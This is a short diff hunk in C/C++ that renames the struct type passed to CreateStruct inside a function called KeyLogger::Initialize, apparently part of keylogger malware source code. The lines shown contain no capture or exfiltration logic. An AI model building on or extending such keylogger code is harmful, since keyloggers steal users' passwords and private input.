@@ -1238,7 +1238,7 @@ PKeyLogger KeyLogger::Initialize(PCHAR AppName)
 
      ClearStruct(KLG);
 
-	PKeyLogger Logger = CreateStruct(TKeyLogger);
+	PKeyLogger Logger = CreateStruct(TKeyLoggerRec);
 	if (Logger == NULL)
 		return NULL;
 
